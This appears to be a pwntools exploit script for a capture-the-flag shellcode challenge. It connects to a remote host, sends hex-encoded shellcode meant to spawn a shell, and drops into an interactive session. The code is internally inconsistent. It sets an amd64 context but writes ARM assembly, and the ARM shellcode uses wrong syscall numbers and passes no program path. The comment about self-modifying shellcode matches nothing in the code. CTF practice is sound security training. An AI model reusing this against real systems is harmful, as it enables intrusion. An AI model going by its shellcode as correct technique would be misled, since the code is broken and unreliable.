#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
context.terminal = ['tmux', 'splitw', '-h']

exe = './blah'
host = 'chall.pwnoh.io'
port = 13375

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *main
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

# arm assembly
# send self modifying shellcode to pop a shell, the program will not execute it if it detects a syscall

# write arm assembly to pop a shell
shellcode = asm('''
    mov r0, #0x3b
    mov r1, #0
    mov r2, #0
    mov r7, #0x2a
    svc #0
''')

log.info('Shellcode: %s' % shellcode)

sc_hex = shellcode.hex()

log.info('Shellcode hex: %s' % sc_hex)

io.recvuntil(b'Welcome to shell code as a shell\n')
io.sendline(sc_hex)


io.interactive()

